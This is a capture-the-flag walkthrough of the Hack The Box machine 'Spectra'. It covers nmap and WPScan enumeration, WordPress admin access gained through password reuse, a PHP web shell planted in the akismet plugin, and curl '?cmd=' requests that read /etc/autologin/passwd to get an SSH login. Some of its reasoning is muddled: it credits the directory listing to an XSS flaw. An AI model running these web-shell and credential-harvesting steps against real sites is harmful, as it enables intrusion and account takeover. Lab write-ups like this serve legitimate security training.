
![Image Spectra]()


## ----------->> Spectra <<-------------

// We start with nmap scan

    $ nmap -sV -A -Pn -T4 10.10.10.229 -p-
------

    Nmap scan report for 10.10.10.229
    Host is up (0.53s latency).
    Not shown: 65412 closed tcp ports (conn-refused), 120 filtered tcp ports (no-response)
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
    | ssh-hostkey: 
    |_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
    80/tcp   open  http    nginx 1.17.4
    |_http-title: Site doesn't have a title (text/html).
    |_http-server-header: nginx/1.17.4
    3306/tcp open  mysql   MySQL (unauthorized)
    |_sslv2: ERROR: Script execution failed (use -d to debug)
    |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
    |_ssl-cert: ERROR: Script execution failed (use -d to debug)
    |_tls-alpn: ERROR: Script execution failed (use -d to debug)
    |_ssl-date: ERROR: Script execution failed (use -d to debug)

// Navigating to http://10.10.10.229/ , get us to webpage with that declares on issue with jira configurations

// And there are 2 redirection links

![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Spectra/1.png)

- First navigae to: http://spectra.htb/main/index.php

- Second navigates to: http://spectra.htb/testing/index.php

// So first i add spectra.htb to /etc/hosts

    $cat /etc/hosts
    # Host addresses
    10.10.10.229 spectra.htb

// Then i navigated back to http://spectra.htb/main/index.php

![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Spectra/2.png)

// There i could see that the website cms is Wordpress and user 'administrator' exist

// Also there is 'Log in' Button that redirect us to /wp-login.php (wordpress login page)

// After that i decided to run [WPScan](https://wpscan.com/wordpress-security-scanner) to check for more options

    $ wpscan --url http://spectra.htb/main/
-----

    _______________________________________________________________
             __          _______   _____
             \ \        / /  __ \ / ____|
              \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
               \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
                \  /\  /  | |     ____) | (__| (_| | | | |
                 \/  \/   |_|    |_____/ \___|\__,_|_| |_|

             WordPress Security Scanner by the WPScan Team
                             Version 3.8.17

           @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
    _______________________________________________________________

    Interesting Finding(s):

    [+] Headers
     | Interesting Entries:
     |  - Server: nginx/1.17.4
     |  - X-Powered-By: PHP/5.6.40
     | Found By: Headers (Passive Detection)
     | Confidence: 100%

    [+] XML-RPC seems to be enabled: http://spectra.htb/main/xmlrpc.php
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%
     | References:
     |  - http://codex.wordpress.org/XML-RPC_Pingback_API
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
     |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

    [+] WordPress readme found: http://spectra.htb/main/readme.html
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%

    [+] The external WP-Cron seems to be enabled: http://spectra.htb/main/wp-cron.php
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 60%
     | References:
     |  - https://www.iplocation.net/defend-wordpress-from-ddos
     |  - https://github.com/wpscanteam/wpscan/issues/1299

    [+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
     | Found By: Rss Generator (Passive Detection)
     |  - http://spectra.htb/main/?feed=rss2, <generator>https://wordpress.org/?v=5.4.2</generator>
     |  - http://spectra.htb/main/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.4.2</generator>

    [+] WordPress theme in use: twentytwenty
     | Location: http://spectra.htb/main/wp-content/themes/twentytwenty/
     | Last Updated: 2021-07-22T00:00:00.000Z
     | Readme: http://spectra.htb/main/wp-content/themes/twentytwenty/readme.txt
     | [!] The version is out of date, the latest version is 1.8
     | Style URL: http://spectra.htb/main/wp-content/themes/twentytwenty/style.css?ver=1.2
     | Style Name: Twenty Twenty
     | Style URI: https://wordpress.org/themes/twentytwenty/
     | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
     | Author: the WordPress team
     | Author URI: https://wordpress.org/
     |
     | Found By: Css Style In Homepage (Passive Detection)
     |
     | Version: 1.2 (80% confidence)
     | Found By: Style (Passive Detection)
     |  - http://spectra.htb/main/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

// The most interesting thing for me was the version 

    [+] WordPress version 5.4.2 identified 

// So i searched online for vulnerabillities([Source1](https://www.tenable.com/plugins/was/112479), [Source2](https://wpscan.com/wordpress/54))

// and the most spoken vulnerabillity for that version is [XSS attack](https://owasp.org/www-community/attacks/xss/)

// Earlier in the first page(http://10.10.10.229/) we had the second link that redirects us to http://spectra.htb/testing/index.php

![Image 2.1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Spectra/2.1.png)

// Since this version of Wordpress vulnerable to XSS, i tried to navigate to http://spectra.htb/testing/

// And it worked !

![Image 5](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Spectra/5.png)

// We navigated to /testing folder with wordpress configuration files

// Checking the files what mostly catched my eye was 'wp-config.php' but it is blank page 

// But, when i opened 'wp-config.php.save' and view the source-page i was able to see Mysql creds in the notes

![Image 6](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Spectra/6.png)

    // ** MySQL settings - You can get this info from your web host ** //
    /** The name of the database for WordPress */
    define( 'DB_NAME', 'dev' );

    /** MySQL database username */
    define( 'DB_USER', 'devtest' );

    /** MySQL database password */
    define( 'DB_PASSWORD', 'devteam01' );

// So now that i have MySQL credentials and port 3306(mysql) is open 

// I tried to connect to the database

    $ mysql -h spectra.htb -P 3306 -u devtest --password=devteam01
    ERROR 1130 (HY000): Host '10.10.16.2' is not allowed to connect to this MySQL server

// But it didnt work... moving on!

// perhaps, moving back! i moved back to wp-login page and tried to connect with user 'administrator'(That we see in http://spectra.htb/main/)

// With the databse password 'devteam01' , And it worked !!!

![Image 7](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Spectra/7.png)

// Searching where i could injection to a php script, i found option to at: 'Apperance' -> 'Theme Editor'

// And tried to edit the '404 page', But when tried to Upload the file i got ERROR

![Image 10](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Spectra/10.png)

// So again to the search i notice another interesting location at: 'Plugins' -> 'Plugin Editor' 

// There we have permissions to edit akismet/akismet.php file 

// and using this [source](https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/) i inject value cmd that it basically a web-shell

![Image 8](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Spectra/8.png)

// Now lets test it

    $ curl http://spectra.htb/main/wp-content/plugins/akismet/akismet.php?cmd=id
    uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)
    Hi there!  I'm just a plugin, not much I can do when called directly.
    
// It worked !!, lets check the users

    $ curl http://spectra.htb/main/wp-content/plugins/akismet/akismet.php?cmd=ls+/home
    chronos
    katie
    nginx
    root
    user


// Searching(a lot) in the machine got me finally to streing file called 'autologin.conf.orig'

    $ curl http://spectra.htb/main/wp-content/plugins/akismet/akismet.php?cmd=ls+/opt

    VirtualBox
    autologin.conf.orig
    broadcom
    displaylink
    eeti
    google
    neverware
    tpm1
    tpm2

// Lets see his content

    $ curl http://spectra.htb/main/wp-content/plugins/akismet/akismet.php?cmd=cat+/opt/autologin.conf.orig

    # Copyright 2016 The Chromium OS Authors. All rights reserved.
    # Use of this source code is governed by a BSD-style license that can be
    # found in the LICENSE file.
    description   "Automatic login at boot"
    author        "chromium-os-dev@chromium.org"
    # After boot-complete starts, the login prompt is visible and is accepting
    # input.
    start on started boot-complete
    script
      passwd=
      # Read password from file. The file may optionally end with a newline.
      for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
        if [ -e "${dir}/passwd" ]; then
          passwd="$(cat "${dir}/passwd")"
          break
        fi
      done
      if [ -z "${passwd}" ]; then
        exit 0
      fi
      # Inject keys into the login prompt.
      #
      # For this to work, you must have already created an account on the device.
      # Otherwise, no login prompt appears at boot and the injected keys do the
      # wrong thing.
      /usr/local/sbin/inject-keys.py -s "${passwd}" -k enter
    end script

// It looks like a script that store a key(password), also there is mantioned directory '/etc/autologin', lets check it

    $ curl http://spectra.htb/main/wp-content/plugins/akismet/akismet.php?cmd=ls+/etc/autologin
    passwd

// Indeed there passwd file, lets open him

    $ curl http://spectra.htb/main/wp-content/plugins/akismet/akismet.php?cmd=cat+/etc/autologin/passwd
    SummerHereWeCome!!

// We have a passowrd ! , we can try now SSH to the machine

    $ssh katie@10.10.10.229
    Password: 
    katie@spectra ~ $ 

// It worked with user katie !

// And we got user flag !

    katie@spectra ~ $ cat user.txt 
    e89d2............................

// 





